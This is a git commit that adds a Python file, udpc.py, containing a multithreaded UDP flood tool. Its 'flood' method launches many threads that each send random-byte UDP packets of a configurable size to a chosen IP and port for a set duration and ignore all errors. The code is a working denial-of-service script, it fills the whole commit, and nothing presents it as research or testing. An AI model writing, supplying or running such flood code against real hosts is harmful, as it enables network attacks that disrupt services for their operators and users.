878114eeda1f50c70a71a7f1cf860042db4bf921
zJonchx <jonathaneliaschavez123@gmail.com>
2025-06-04 11:44:51 -0300

    Create udpc.py

---
+++ udpc.py
@@ -0,0 +1,45 @@
+import socket
+import threading
+import os
+
+class UDPC:
+    def __init__(self, ip, port, threads, packetsize, stop_event=None):
+        self.ip = ip
+        self.port = port
+        self.threads = threads
+        self.packetsize = packetsize
+        self.stop_event = stop_event
+        self.on = False
+
+    def flood(self, duration):
+        import time
+        self.on = True
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.send, daemon=True)
+            t.start()
+            threads.append(t)
+        end_time = time.time() + duration
+        try:
+            while time.time() < end_time and self.on:
+                if self.stop_event and self.stop_event.is_set():
+                    break
+                time.sleep(0.1)
+            self.stop()
+        except KeyboardInterrupt:
+            self.stop()
+
+    def stop(self):
+        self.on = False
+
+    def send(self):
+        while self.on:
+            if self.stop_event and self.stop_event.is_set():
+                break
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                data = os.urandom(self.packetsize)
+                s.sendto(data, (self.ip, self.port))
+                s.close()
+            except Exception:
+                pass
